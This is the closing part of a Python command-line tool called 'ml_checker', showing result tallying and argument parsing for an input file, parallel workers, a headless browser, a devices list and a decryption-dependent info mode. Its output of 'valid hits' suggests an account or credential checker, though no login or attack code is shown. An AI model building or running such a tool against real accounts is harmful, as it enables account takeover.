    for r in results:
        counts[r.status] = counts.get(r.status, 0) + 1
    print("done:", counts, flush=True)
    print(f"results -> {outfile}", flush=True)
    print(f"valid hits -> {full_path}", flush=True)
    while not log_q.empty():
        print(log_q.get(), flush=True)
    return 0


def main(argv=None):
    ap = argparse.ArgumentParser(prog="ml_checker")
    ap.add_argument("-f", "--file", type=Path, required=True)
    _data_dir = Path(os.environ.get("ML_DATA_DIR", "/tmp/npa"))
    ap.add_argument("-o", "--out", type=Path, default=_data_dir / "results.txt")
    ap.add_argument("-w", "--workers", type=int, default=WORKERS)
    ap.add_argument("--headed", action="store_true")
    ap.add_argument("--info", action="store_true")
    ap.add_argument("--devices", type=str, default=str(_data_dir / "devices.txt"))
    args = ap.parse_args(argv)

    if not args.file.exists():
        print(f"no such file: {args.file}", file=sys.stderr); return 2
    if args.info and zstd is None:
        print("--info requires: pip install zstandard", file=sys.stderr); return 2
    if args.info and not HAVE_CRYPTO:
        print("--info requires: pip install cryptography", file=sys.stderr); return 2
    return run(args.file, args.out, args.workers, headless=not args.headed,
               with_info=args.info, devices_file=args.devices)


if __name__ == "__main__":
    sys.exit(main())